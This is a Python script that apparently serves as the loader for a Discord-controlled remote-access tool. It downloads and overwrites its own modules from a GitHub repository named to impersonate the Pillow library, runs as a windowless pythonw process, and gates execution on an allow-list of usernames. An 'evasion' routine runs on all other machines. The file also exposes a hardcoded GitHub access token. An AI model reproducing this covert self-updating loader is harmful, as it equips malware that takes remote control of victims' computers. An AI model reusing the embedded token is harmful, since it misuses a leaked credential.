import os
import sys
import json
import requests
import subprocess
import time
from functions.discord_handler import start_discord_bot

GITHUB_RAW_URL_TEMPLATE = "https://raw.githubusercontent.com/pillowlibrary/pillow/main/functions/{}"
UPDATE_STATUS_FILE = "update_status.json"
LOCAL_FUNCTIONS_PATH = os.path.join(os.getcwd(), "functions")
DISCORD_HANDLER_FILE = "discord_handler.py"

allowed_users = ["border", "bob", "User"]

github_token = "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"

def is_another_instance_running():
    # Get the current process ID
    current_pid = os.getpid()
    # Use 'tasklist' to find all instances of 'pythonw.exe'
    result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq pythonw.exe', '/FO', 'CSV'], stdout=subprocess.PIPE, text=True)
    output = result.stdout.strip()
    lines = output.split('\n')
    # Remove header line if present
    if len(lines) > 1 and lines[0].startswith('"Image Name"'):
        lines = lines[1:]
    # Count the number of 'pythonw.exe' processes excluding the current one
    count = 0
    for line in lines:
        # Each line is in CSV format: "Image Name","PID","Session Name","Session#","Mem Usage"
        # Split the CSV line
        fields = line.strip().strip('"').split('","')
        if len(fields) >= 2:
            try:
                pid = int(fields[1])
                if pid != current_pid:
                    count += 1
            except ValueError:
                continue
    return count > 0

def check_update_status():
    if os.path.exists(UPDATE_STATUS_FILE):
        with open(UPDATE_STATUS_FILE, "r") as f:
            data = json.load(f)
            if data.get("update"):
                return data.get("files_to_update", [])
    return []

def reset_update_flag():
    data = {"update": False, "files_to_update": []}
    with open(UPDATE_STATUS_FILE, "w") as f:
        json.dump(data, f)

def download_and_update_files(files_to_update):
    headers = {'Authorization': f'token {github_token}'}

    for file_name in files_to_update:
        raw_url = GITHUB_RAW_URL_TEMPLATE.format(file_name)
        response = requests.get(raw_url, headers=headers)

        if response.status_code == 200:
            local_file_path = os.path.join(LOCAL_FUNCTIONS_PATH, file_name)
            os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
            with open(local_file_path, "wb") as file:
                file.write(response.content)
            print(f"Updated: {file_name}")
        else:
            print(f"Failed to download: {file_name}. Status code: {response.status_code}")

    # Always update the discord_handler.py file
    raw_discord_handler_url = GITHUB_RAW_URL_TEMPLATE.format(DISCORD_HANDLER_FILE)
    response = requests.get(raw_discord_handler_url, headers=headers)
    if response.status_code == 200:
        local_discord_handler_path = os.path.join(LOCAL_FUNCTIONS_PATH, DISCORD_HANDLER_FILE)
        with open(local_discord_handler_path, "wb") as file:
            file.write(response.content)
        print(f"Updated: {DISCORD_HANDLER_FILE}")
    else:
        print(f"Failed to update {DISCORD_HANDLER_FILE}. Status code: {response.status_code}")

def evasion():
    print("hello vro <3")

def main():
    if is_another_instance_running():
        print("Another instance of the script is already running. Exiting.")
        return

    username = os.getlogin()
    if username in allowed_users:
        files_to_update = check_update_status()
        if files_to_update:
            download_and_update_files(files_to_update)
            reset_update_flag()
        else:
            print("No update flag set. Proceeding without update.")
    else:
        evasion()
        return

    start_discord_bot()

if __name__ == "__main__":
    main()
